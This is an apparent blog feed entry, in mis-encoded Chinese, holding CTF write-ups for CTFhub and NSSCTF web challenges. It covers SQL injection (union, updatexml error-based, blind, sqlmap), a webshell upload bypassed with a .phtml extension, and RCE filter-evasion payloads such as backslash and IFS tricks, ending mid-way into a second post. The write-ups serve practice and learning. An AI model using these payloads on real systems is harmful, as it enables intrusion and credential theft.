    <content type="html"><![CDATA[<h1 id="CTFhub-NSSCTF"><a href="#CTFhub-NSSCTF" class="headerlink" title="CTFhub+NSSCTF"></a>CTFhub+NSSCTF</h1><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><h3 id="æ•´æ•°å‹"><a href="#æ•´æ•°å‹" class="headerlink" title="æ•´æ•°å‹"></a>æ•´æ•°å‹</h3><p> æŸ¥è¯¢åˆ—æ•°-order by è¯­å¥  è¦æ³¨æ„çš„æ˜¯è”åˆæŸ¥è¯¢å‰åä¸¤æ¡ select è¯­å¥æŸ¥è¯¢æ•°æ®çš„åˆ—æ•°æ˜¯ç›¸ç­‰çš„ï¼Œæ•…éœ€è¦ä½¿ç”¨ order by è¯­å¥æ¥åˆ¤æ–­æ³¨ å…¥ç‚¹sqlè¯­å¥æŸ¥è¯¢çš„åˆ—æ•°æ˜¯å¤šå°‘</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-23-40.png" alt="PixPin_2025-03-06_19-23-40"></p><p>UNION è”åˆæŸ¥è¯¢æ•°æ®åº“ä¿¡æ¯ï¼šç¡®è®¤å®Œæ˜¾ç¤ºä½å¯ä»¥åˆ©ç”¨æ˜¾ç¤ºä½æŸ¥è¯¢å½“å‰æ•°æ®åº“åï¼šå›æ˜¾ä¸ºsqli</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-25-23.png" alt="PixPin_2025-03-06_19-25-23"></p><p>å…³äºå°†idå€¼è®¾ç½®ä¸º0æˆ–è€…è´Ÿæ•°çš„è§£é‡Š;</p><p>ç”±äºæˆ‘ä»¬çš„è¯­å¥æ˜¯æ’å…¥åˆ°åŸæœ‰è¯­å¥åé¢ï¼Œè¿™æ ·å°±ä¼šå‡ºç°ä¸¤ä¸ªSQLè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œç”±äºSQLæŸ¥è¯¢é»˜è®¤è¿”å›ä¸€ è¡Œæ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬æ’å…¥çš„ç¬¬äºŒè¡Œè¯­å¥çš„ç»“æœå°±ä¸ä¼šè¢«è¿”å›ï¼Œåªä¼šè¿”å›åŸæœ‰çš„SQLè¯­å¥çš„æŸ¥è¯¢å†…å®¹ã€‚ è¦è®©æ•°æ®åº“æŸ¥è¯¢æˆ‘ä»¬æ’å…¥çš„è¯­å¥ï¼Œéœ€è¦è®©åŸæœ‰SQLè¯­å¥æŸ¥è¯¢ä¸ºç©ºã€‚</p><p>æ¥ç€æŸ¥è¯¢è¡¨å</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-27-07.png" alt="PixPin_2025-03-06_19-27-07"></p><p>select group_concat(table_name) from information_schema.tables where  table_schema&#x3D;â€™sqliâ€™; åŠ å¼•å·</p><p>æŸ¥åˆ—å </p><p>select group_concat(column_name) from information_schema.columns where  table_name&#x3D;â€™flagâ€™ and table_schema&#x3D;â€™flagâ€™;  åŠ å¼•å·</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-28-38.png" alt="PixPin_2025-03-06_19-28-38"></p><p>æŸ¥æ•°æ®</p><p>select group_concat(username,0x3a,password) from security.users;  ä¸åŠ å¼•å·</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-36-26.png" alt="PixPin_2025-03-06_19-36-26"></p><h3 id="å­—ç¬¦å‹æ³¨å…¥"><a href="#å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="å­—ç¬¦å‹æ³¨å…¥"></a>å­—ç¬¦å‹æ³¨å…¥</h3><p>åŒºåˆ«ä¸å¤§ï¼Œéœ€è¦å…ˆåˆ¤æ–­é—­åˆç¬¦å·</p><p>å¸¸è§çš„æœ‰  </p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scilab"><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&quot;</span><br>()<br></code></pre></td></tr></table></figure><p>è¾“å…¥å¸¸ç”¨é—­åˆç¬¦å·ä½¿é¡µé¢æŠ›å‡ºsqlè¯­æ³•é”™è¯¯çš„æŠ¥é”™ä¿¡æ¯ï¼Œæ ¹æ®æŠ¥é”™ä¿¡æ¯å¯ä»¥<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-39-03.png" alt="PixPin_2025-03-06_19-39-03"></p><p>å‘ç°é—­åˆç¬¦å·</p><p>ç„¶åé‡å¤ä»¥ä¸Šæ­¥éª¤</p><p>æŸ¥åº“å</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-40-01.png" alt="PixPin_2025-03-06_19-40-01"></p><p>æŸ¥è¡¨å<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-41-10.png" alt="PixPin_2025-03-06_19-41-10"></p><p>æŸ¥æ•°æ® å¾—åˆ°flag<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_19-43-41.png" alt="PixPin_2025-03-06_19-43-41"></p><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-17-29.png" alt="PixPin_2025-03-06_20-17-29"></p><p>åœ¨æœ‰äº›æ—¶å€™è™½ç„¶å­˜åœ¨æ³¨å…¥ç‚¹èƒ½å¤Ÿæ‰§sqlè¯­å¥ï¼Œä½†æ˜¯é¡µé¢ä¸­å¹¶æ²¡æœ‰æ‰“å°sqlæ‰§è¡Œç»“æœçš„å›æ˜¾ä½ç½®ï¼Œä½†æ˜¯å¦‚æœé¡µ é¢èƒ½å¤ŸæŠ›å‡ºæŠ¥é”™çš„ä»£ç ä¿¡æ¯ï¼Œå°±å¯ä»¥åˆ©ç”¨æŠ¥é”™å›æ˜¾ï¼Œæ¥æŸ¥çœ‹æ³¨å…¥çš„sqlè¯­å¥çš„æ‰§è¡Œç»“æœ</p><p><code>updatexml</code> æ˜¯ SQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œä¸»è¦ç”¨äºå¤„ç†å’ŒæŸ¥è¯¢ XML æ•°æ®ã€‚å®ƒé€šå¸¸ç”¨äº MySQL æ•°æ®åº“ï¼Œä½†å®ƒåœ¨å®‰å…¨æ–¹é¢ä¹Ÿå¾ˆæ•æ„Ÿï¼Œå°¤å…¶æ˜¯åœ¨ SQL æ³¨å…¥æ”»å‡»ä¸­è¢«å¹¿æ³›åˆ©ç”¨ã€‚</p><hr><h3 id="ğŸ“˜-åŸºæœ¬è¯­æ³•ï¼š"><a href="#ğŸ“˜-åŸºæœ¬è¯­æ³•ï¼š" class="headerlink" title="ğŸ“˜ åŸºæœ¬è¯­æ³•ï¼š"></a>ğŸ“˜ <strong>åŸºæœ¬è¯­æ³•ï¼š</strong></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sql<br><br><br><br><span class="hljs-function"><span class="hljs-title">UPDATEXML</span><span class="hljs-params">(xml_target, xpath_expr, new_value)</span></span><br></code></pre></td></tr></table></figure><ul><li>**<code>xml_target</code>**ï¼šè¦æ“ä½œçš„ XML æ•°æ®ã€‚</li><li>**<code>xpath_expr</code>**ï¼šXPath è¡¨è¾¾å¼ï¼Œç”¨äºå®šä½ XML èŠ‚ç‚¹ã€‚</li><li>**<code>new_value</code>**ï¼šæ›¿æ¢çš„å€¼ã€‚</li></ul><p><strong>ç¤ºä¾‹</strong>ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">sql</span><br><br><br>å¤åˆ¶ç¼–è¾‘<br><span class="hljs-keyword">SELECT</span> UPDATEXML(<span class="hljs-string">&#x27;&lt;root&gt;&lt;name&gt;John&lt;/name&gt;&lt;/root&gt;&#x27;</span>, <span class="hljs-string">&#x27;/root/name&#x27;</span>, <span class="hljs-string">&#x27;Jane&#x27;</span>);<br></code></pre></td></tr></table></figure><p>ğŸ”¸ <strong>ç»“æœ</strong>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">xml<br><br><br><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Jane<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-function"><span class="hljs-keyword">select</span>  <span class="hljs-title">user</span>()),0x7e),1))</span>; <br></code></pre></td></tr></table></figure><p>updatexmlçš„ç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ˜¯ç”¨&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;â€¦è¿™ç§æ ¼å¼ï¼Œä»¥~å¼€å¤´çš„å†…å®¹ä¸æ˜¯ xmlæ ¼å¼çš„è¯­æ³•ï¼Œconcat()å‡½æ•°ä¸ºå­—ç¬¦ä¸²è¿æ¥å‡½æ•°æ˜¾ç„¶ä¸ç¬¦åˆè§„åˆ™ï¼Œä½†æ˜¯ä¼šå°†æ‹¬å·å†…çš„æ‰§è¡Œç»“æœä»¥é”™è¯¯çš„ å½¢å¼æŠ¥å‡º è¯¥å‡½æ•°æœ€å¤§æ˜¾ç¤ºé•¿åº¦ä¸º32ï¼Œè¶…è¿‡é•¿åº¦å¯ä»¥é…åˆsubstrã€limitç­‰å‡½æ•°æ¥æ˜¾ç¤º</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-19-50.png" alt="PixPin_2025-03-06_20-19-50">+</p><p>å€Ÿç”¨updateexmlå‡½æ•°æŸ¥è¯¢åº“å æ³¨æ„åˆ°æ•°æ®æœ«å°¾æ²¡æœ‰â€œ~â€ æ‰€ä»¥æ˜¯æ²¡æœ‰æ˜¾ç¤ºå®Œå…¨çš„ æ”¹å˜substråä¸¤ä¸ªå‚æ•° å¾—åˆ°å…¨éƒ¨åº“å</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-23-29.png" alt="PixPin_2025-03-06_20-23-29"></p><p>ä¹‹åæ­¥éª¤ä¸€æ ·</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-25-36.png" alt="PixPin_2025-03-06_20-25-36"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-27-07.png" alt="PixPin_2025-03-06_20-27-07"></p><p>å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-28-23.png" alt="PixPin_2025-03-06_20-28-23"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-06_20-29-35.png" alt="PixPin_2025-03-06_20-29-35"></p><h3 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>å…ˆç¡®å®šæ•°æ®åº“åæœ‰å‡ ä½ï¼Œç„¶åçŒœå­—æ¯ï¼Œç”¨burpçˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-11-20.png" alt="PixPin_2025-03-07_20-11-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-13-21.png" alt="PixPin_2025-03-07_20-13-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-13-55.png" alt="PixPin_2025-03-07_20-13-55"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-29-08.png" alt="PixPin_2025-03-07_20-29-08"></p><p><img src="E:\temp\PixPin_2025-03-07_20-30-24.png" alt="PixPin_2025-03-07_20-30-24"></p><p><img src="E:\temp\PixPin_2025-03-07_20-34-16.png" alt="PixPin_2025-03-07_20-34-16"></p><p>ä½†æ˜¯å¤ªéº»çƒ¦äº†äºæ˜¯è½¬ç”¨sqlmap</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u xxx <span class="hljs-comment">--currernt-db</span><br></code></pre></td></tr></table></figure><p>åˆæŸ¥åº“å</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-42-28.png" alt="PixPin_2025-03-07_20-42-28"></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sqlmap -u xxx -D sqli <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-07_20-49-20.png" alt="PixPin_2025-03-07_20-49-20"></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">sqlmap -u xxx -D sqli -<span class="hljs-built_in">T</span> flag --<span class="hljs-built_in">columns</span><br>sqlmap -u xxx -D sqli -<span class="hljs-built_in">T</span> flag --dump<br></code></pre></td></tr></table></figure><p>æŸ¥åˆ°flag</p><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>å»¶æ—¶æ³¨å…¥æ˜¯ç›²æ³¨çš„ä¸€ç§ï¼Œåœ¨é¡µé¢æ²¡æœ‰å›æ˜¾å’ŒæŠ¥é”™ï¼Œä¹Ÿä¸èƒ½é€šè¿‡æ‹¼æ¥ and 0 ã€and 1 çš„å¸ƒå°”è¡¨è¾¾å¼æ¥åˆ¤æ–­ sqlè¯­å¥æ˜¯å¦æˆåŠŸæ‰§è¡Œï¼Œåªèƒ½åœ¨å‚æ•°åand sleep(5) ï¼Œ åŠ ä¸Šå»¶æ—¶å‡½æ•°sleep()ï¼Œ å¦‚æœsqlè¯­å¥æ‰§è¡Œé¡µé¢åˆ·æ–° å°±ä¼šæœ‰ä¸€å®šçš„å»¶æ—¶ï¼Œæ ¹æ®é¡µé¢æ˜¯å¦æœ‰å»¶æ—¶æ¥åˆ¤æ–­sqlè¯­å¥æ‰§è¡Œä¸å¦æ‰€ä»¥å«åšå»¶æ—¶æ³¨å…¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-20-08.png" alt="PixPin_2025-03-10_20-20-08"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-22-14.png" alt="PixPin_2025-03-10_20-22-14"></p><p>æ„Ÿè§‰æ˜¯å¸ƒå°”ç›²æ³¨plusç‰ˆ ä¸€ä¸ªä¸€ä¸ªçŒœåŠ ä¸ªsleepåˆ¤æ–­å¯¹é”™<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-34-06.png" alt="PixPin_2025-03-10_20-34-06"></p><p>ä¸€æ ·ç”¨burpçˆ†ç ´æœ€åç›´æ¥ç”¨äº†sqlmap</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-36-14.png" alt="PixPin_2025-03-10_20-36-14"></p><p>åé¢å¥½åƒæ²¡æˆªå›¾</p><h3 id="æ•°æ®åº“ç»“æ„"><a href="#æ•°æ®åº“ç»“æ„" class="headerlink" title="æ•°æ®åº“ç»“æ„"></a>æ•°æ®åº“ç»“æ„</h3><p>ç›´æ¥ç”¨sqlmap</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-46-31.png" alt="PixPin_2025-03-10_20-46-31"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-10_20-57-18.png" alt="PixPin_2025-03-10_20-57-18"></p><p><img src="E:\temp\PixPin_2025-03-11_20-44-48.png" alt="PixPin_2025-03-11_20-44-48"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-45-17.png" alt="PixPin_2025-03-11_20-45-17"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-46-27.png" alt="PixPin_2025-03-11_20-46-27"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-48-00.png" alt="PixPin_2025-03-11_20-48-00"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-49-20.png" alt="PixPin_2025-03-11_20-49-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_20-49-42.png" alt="PixPin_2025-03-11_20-49-42"></p><h3 id="ç©ºæ ¼ç»•è¿‡"><a href="#ç©ºæ ¼ç»•è¿‡" class="headerlink" title="ç©ºæ ¼ç»•è¿‡"></a>ç©ºæ ¼ç»•è¿‡<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-13_20-53-33.png" alt="PixPin_2025-03-13_20-53-33"></h3><p>ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•å¾ˆå¤šï¼Œä½†æ˜¯è¿™äº›éƒ½ä¸è¡Œ</p><p>æœ€åæ˜¯ç”¨çš„&#x2F;**&#x2F;</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-09-20.png" alt="PixPin_2025-03-11_21-09-20"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-12-02.png" alt="PixPin_2025-03-11_21-12-02"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-13-57.png" alt="PixPin_2025-03-11_21-13-57"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-15-30.png" alt="PixPin_2025-03-11_21-15-30"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-17-58.png" alt="PixPin_2025-03-11_21-17-58"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-11_21-23-28.png" alt="PixPin_2025-03-11_21-23-28"></p><h1 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><p>[<a href="https://www.nssctf.cn/problem/388">SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload1.0</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-48-37.png" alt="PixPin_2025-03-16_14-48-37"></p><p>ä¸€å¥è¯æœ¨é©¬æ”¹ä¸€ä¸‹åç¼€ä¸Šä¼ ï¼Œåœ¨bpé‡Œå†æ”¹å›æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-48-56.png" alt="PixPin_2025-03-16_14-48-56"></p><p>ä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-50-12.png" alt="PixPin_2025-03-16_14-50-12"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-53-01.png" alt="PixPin_2025-03-16_14-53-01"></p><p>ä¹Ÿæ˜¯æˆåŠŸæ‰¾åˆ°äº†é”™è¯¯çš„flag</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-56-24.png" alt="PixPin_2025-03-16_14-56-24"></p><p>åœ¨ç½‘ä¸Šæœwpå‘ç°åœ¨phpinfo<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_14-57-13.png" alt="PixPin_2025-03-16_14-57-13"></p><p>[<a href="https://www.nssctf.cn/problem/423">SWPUCTF 2021 æ–°ç”Ÿèµ›]easyupload2.0</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-02-39.png" alt="PixPin_2025-03-16_15-02-39"></p><p>ä¹Ÿæ˜¯ä¸€æ ·çš„å¼€å§‹ï¼Œç„¶åæ˜¯å¾ˆå¤šæ— ç”¨çš„å°è¯•</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-14-34.png" alt="PixPin_2025-03-16_15-14-34"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-15-32.png" alt="PixPin_2025-03-16_15-15-32"></p><p>èƒ½ä¸Šä¼ ä½†æ˜¯è¿æ¥ä¸ä¸Šï¼Œå¥½åƒæ˜¯å› ä¸º<strong>æœåŠ¡å™¨çš„ MIME ç±»å‹é™åˆ¶</strong>ï¼Œå¯èƒ½ä¸å…è®¸ <code>image/jpeg</code> æ‰§è¡Œ PHP</p><p>æ”¹äº†ä¹Ÿä¸è¡Œï¼Œã€‚ã€‚é€‚ç”¨ï¼šæœåŠ¡å™¨ä»…<strong>æ£€æŸ¥ MIME ç±»å‹</strong>ï¼Œä½†ä¸ä¼šå®é™…è§£æå†…å®¹æ—¶é€‚ç”¨ã€‚</p><p>é€‚ç”¨äº<strong>åŸºäºå‰ç«¯ JavaScript æ£€æŸ¥ MIME</strong>çš„ç»•è¿‡ã€‚</p><p>å¦‚æœæœåŠ¡å™¨ <strong>äºŒæ¬¡æ ¡éªŒæ–‡ä»¶å†…å®¹</strong>ï¼ˆå¦‚ <code>fileinfo</code> å‡½æ•°ï¼‰ï¼Œåˆ™å¯èƒ½æ— æ³•ç»•è¿‡ã€‚</p><p><a href="https://blog.csdn.net/m0_53008479/article/details/123366077">1-4 ã€å®éªŒã€‘04-phtmlç»•è¿‡+ä»£ç å®¡è®¡-CSDNåšå®¢</a></p><p><strong>å¦‚æœä½ çš„æ–‡ä»¶æ˜¯ä»¥phtmlç»“å°¾çš„ï¼Œå®ƒä¼šæŠŠå®ƒå½“ä½œphpä»£ç æ¥æ‰§è¡Œã€‚</strong></p><p>å¤ªå¥½äº†æˆ‘ä»¬æœ‰æ•‘äº†<img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-25-41.png" alt="PixPin_2025-03-16_15-25-41"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-26-09.png" alt="PixPin_2025-03-16_15-26-09"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_15-31-08.png" alt="PixPin_2025-03-16_15-31-08"></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>[<a href="https://www.nssctf.cn/problem/3090">UUCTF 2022 æ–°ç”Ÿèµ›]ez_rce</a></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-58-08.png" alt="PixPin_2025-03-16_16-58-08"></p><p>ç–‘ä¼¼æŠŠæˆ‘çŸ¥é“çš„å…¨è¿‡æ»¤äº†ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œ</p><p><a href="https://zhuanlan.zhihu.com/p/391439312">å‘½ä»¤æ‰§è¡Œ(RCE)é¢å¯¹å„ç§è¿‡æ»¤ï¼Œéªšå§¿åŠ¿ç»•è¿‡æ€»ç»“ - çŸ¥ä¹</a></p><p>catè¢«è¿‡æ»¤ç”¨äº†find</p><p>systemç”¨äº†printf</p><p>lsè¢«è¿‡æ»¤</p><p>å¯ä»¥åœ¨ä¸­é—´ç”¨åæ–œæ \ </p><p>&#x2F;?code&#x3D;printf(<code>l\s /</code>);</p><p>?code&#x3D;printf(<code>l$IFS$s /</code>);   # IFS å˜é‡ç»•è¿‡<br>?code&#x3D;printf(<code>\154\163 /</code>);  # ASCII ç  (\154 &#x3D; l, \163 &#x3D; s)</p><p>?code&#x3D;printf(<code>l&quot;.&quot;s /</code>);</p><p>?code&#x3D;printf(<code>l$&#123;&#39;&#39;&#125;s /</code>);</p><h3 id="find-ä»£æ›¿-ls"><a href="#find-ä»£æ›¿-ls" class="headerlink" title="find ä»£æ›¿ ls"></a><strong><code>find</code> ä»£æ›¿ <code>ls</code></strong></h3><p>å¦‚æœ <code>ls</code> è¢«ä¸¥æ ¼ç¦æ­¢ï¼Œå¯ä»¥</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">?code=<span class="hljs-built_in">printf</span>(`find / -maxdepth <span class="hljs-number">1</span>`);<br></code></pre></td></tr></table></figure><p> <code>/</code> ç›®å½•ä¸‹çš„å†…å®¹ï¼Œç±»ä¼¼ <code>ls /</code>ã€‚</p><p>æ³¨ï¼š</p><p>\ç‰¹æ®Šå­—ç¬¦å»æ‰åŠŸèƒ½æ€§ï¼Œå•çº¯è¡¨ç¤ºä¸ºå­—ç¬¦ä¸²ï¼Œè€Œlinuxçœ‹åˆ°åæ–œçº¿\ä¼šè‡ªåŠ¨å¸®ä½ å»æ‰,æ­£å¸¸æ‰§è¡Œå‘½ä»¤</p><p><a href="https://blog.csdn.net/2301_76690905/article/details/134533626">å‘½ä»¤æ‰§è¡ŒRCEåŠå…¶ç»•è¿‡è¯¦ç»†æ€»ç»“ï¼ˆå„æƒ…æ™¯ä¸‹çš„ç»•è¿‡ï¼‰_å‘½ä»¤æ‰§è¡Œç»•è¿‡-CSDNåšå®¢</a></p><p>ç»•è¿‡å°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-37-57.png" alt="PixPin_2025-03-16_16-37-57"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-41-21.png" alt="PixPin_2025-03-16_16-41-21"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-49-37.png" alt="PixPin_2025-03-16_16-49-37"></p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/PixPin_2025-03-16_16-58-08.png" alt="PixPin_2025-03-16_16-58-08"></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQLæ³¨å…¥</tag>
      
      <tag>RCEç»•è¿‡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>webé¢˜ç›®wp</title>
    <link href="/2024/12/06/web%E9%A2%98%E7%9B%AEwp/"/>
    <url>/2024/12/06/web%E9%A2%98%E7%9B%AEwp/</url>
    
    <content type="html"><![CDATA[<h2 id="webé¢˜ç›®wp"><a href="#webé¢˜ç›®wp" class="headerlink" title="webé¢˜ç›®wp"></a>webé¢˜ç›®wp</h2><h2 id="1-ä¼šèµ¢å—"><a href="#1-ä¼šèµ¢å—" class="headerlink" title="1.ä¼šèµ¢å—"></a>1.ä¼šèµ¢å—</h2><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20154344.png" alt="å±å¹•æˆªå›¾ 2024-11-28 154344"></p><p>å…ˆæŸ¥çœ‹ç½‘é¡µæºä»£ç </p><p>åœ¨bodyéƒ¨åˆ†æ‰¾åˆ°flagç¬¬ä¸€éƒ¨åˆ†å’Œç¬¬äºŒéƒ¨åˆ†åœ°å€</p><p>![å±å¹•æˆªå›¾ 2024-11-28 193756](C:\Users\Lenovo\Pictures\Screenshots\å±å¹•æˆªå›¾ 2024-11-28 193756.png)</p><p>è¿›å…¥ç¬¬äºŒéƒ¨åˆ†</p><p><img src="https://cdn.jsdelivr.net/gh/everythingis-ok/inage/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-28%20154659.png" alt="å±å¹•æˆªå›¾ 2024-11-28 